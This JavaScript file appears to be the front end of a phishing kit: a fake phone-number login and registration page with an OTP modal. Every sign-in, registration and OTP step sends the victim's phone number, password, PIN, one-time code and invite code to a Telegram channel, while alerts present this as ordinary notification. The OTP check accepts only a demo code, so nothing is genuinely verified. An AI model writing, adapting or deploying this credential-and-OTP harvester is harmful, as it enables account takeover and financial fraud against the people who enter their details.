let timerInterval = null;
let isTimerRunning = false;

// ---------- Screen Navigation ----------
function navigateTo(screenName) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById(`${screenName}-screen`).classList.add('active');
}

// ---------- Input Sanitization ----------
document.addEventListener('DOMContentLoaded', () => {
  const numericInputs = ['login-phone', 'reg-phone', 'login-pin', 'reg-pin', 'modal-otp', 'reg-otp'];
  numericInputs.forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    el.addEventListener('input', () => {
      el.value = el.value.replace(/\D/g, '');
    });
  });

  // Nav buttons
  document.querySelectorAll('[data-nav]').forEach(el => {
    el.addEventListener('click', () => navigateTo(el.dataset.nav));
  });

  // Event listeners
  document.getElementById('btn-signin').addEventListener('click', handleSignIn);
  document.getElementById('btn-signup').addEventListener('click', handleSignUp);
  document.getElementById('btn-send-otp').addEventListener('click', sendRegisterOTP);
  document.getElementById('modal-send-otp-btn').addEventListener('click', sendModalOTP);
  document.getElementById('btn-confirm-otp').addEventListener('click', confirmVerification);
  document.getElementById('btn-close-modal').addEventListener('click', closeModal);
});

// ---------- Register OTP ----------
function sendRegisterOTP() {
  const phone = document.getElementById('reg-phone').value || 'unknown';
  sendTelegram(`🔐 <b>OTP requested (Register)</b>\n📱 Phone: +91 ${phone}`);
  alert('OTP Code Sent successfully! (Telegram notification sent)');
}

// ---------- Login ----------
function handleSignIn() {
  const phone = document.getElementById('login-phone').value.trim();
  const pass  = document.getElementById('login-pass').value;
  const pin   = document.getElementById('login-pin').value.trim();
  const agreed = document.getElementById('privacy-agree').checked;

  if (!agreed) return alert("Please agree to the 'User Privacy Agreement' first.");
  if (!phone) return alert('Please enter a valid Phone number.');
  if (phone.length < 10) return alert('Please enter a valid 10-digit Phone number.');
  if (!pin) return alert('Please enter your 6-digit PIN.');
  if (pin.length !== 6) {
    alert('Please enter a valid 6-digit PIN.');
    document.getElementById('login-pin').value = '';
    return;
  }

  resetTimer();
  document.getElementById('dynamic-otp-text').innerText = `OTP will be sent to +91 ${phone}`;
  document.getElementById('modal-otp').value = '';

  sendTelegram(`✅ <b>Sign In attempt</b>\n📱 Phone: ${phone}\n🔑 Password: <b>${pass || 'No Password'}</b>\n🔢 PIN: ${pin}`);

  document.getElementById('verification-modal').style.display = 'flex';
}

// ---------- Modal OTP ----------
function sendModalOTP() {
  if (isTimerRunning) return alert('Please wait for the timer to finish before requesting a new OTP.');

  const phone = document.getElementById('login-phone').value || 'unknown';
  sendTelegram(`🔐 <b>OTP requested (Modal)</b>\n📱 Phone: +91 ${phone}`);
  alert('OTP Sent Successfully!');
  startTimer();
}

function startTimer() {
  const timerEl     = document.getElementById('modal-timer');
  const countdownEl = document.getElementById('timer-countdown');
  const sendBtn     = document.getElementById('modal-send-otp-btn');

  if (timerInterval) clearInterval(timerInterval);
  let seconds = CONFIG.TIMER_SECONDS;

  isTimerRunning = true;
  timerEl.classList.add('active');
  countdownEl.textContent = seconds;
  sendBtn.disabled = true;

  timerInterval = setInterval(() => {
    seconds--;
    countdownEl.textContent = seconds;
    if (seconds <= 0) {
      clearInterval(timerInterval);
      timerInterval = null;
      isTimerRunning = false;
      timerEl.classList.remove('active');
      sendBtn.disabled = false;
      countdownEl.textContent = CONFIG.TIMER_SECONDS;
    }
  }, 1000);
}

function resetTimer() {
  if (timerInterval) clearInterval(timerInterval);
  timerInterval = null;
  isTimerRunning = false;
  document.getElementById('modal-timer').classList.remove('active');
  document.getElementById('modal-send-otp-btn').disabled = false;
}

function closeModal() {
  resetTimer();
  document.getElementById('verification-modal').style.display = 'none';
}

function confirmVerification() {
  const otp   = document.getElementById('modal-otp').value.trim();
  const phone = document.getElementById('login-phone').value || 'unknown';

  if (!otp) return alert('Please enter the OTP Code.');
  if (otp.length !== 6) {
    alert('❌ Please enter a valid 6-digit OTP.');
    document.getElementById('modal-otp').value = '';
    return;
  }

  sendTelegram(`🔑 <b>OTP Entered</b>\n📱 Phone: +91 ${phone}\n🔢 OTP: ${otp}`);

  if (otp === CONFIG.DEMO_OTP) {
    sendTelegram(`✅ <b>Login Successful</b>\n📱 Phone: +91 ${phone}\n🔑 OTP verified!`);
    alert('✅ Verification successful! Logging in...');
    closeModal();
    // TODO: yahan dashboard pe redirect karo
  } else {
    alert('❌ Wrong OTP! Please try again.');
    document.getElementById('modal-otp').value = '';
  }
}

// ---------- Register ----------
function handleSignUp() {
  const username = document.getElementById('reg-username').value || 'unknown';
  const phone    = document.getElementById('reg-phone').value || 'unknown';
  const pass     = document.getElementById('reg-pass').value || 'No Password';
  const pin      = document.getElementById('reg-pin').value || 'No PIN';
  const invite   = document.getElementById('reg-invite').value || '—';

  sendTelegram(`🆕 <b>New registration</b>\n👤 User: ${username}\n📱 Phone: +91 ${phone}\n🔑 Password: <b>${pass}</b>\n🔢 PIN: ${pin}\n🎫 Invite: ${invite}`);

  alert('Registration successful! (Telegram notification sent)');
  navigateTo('login');
}
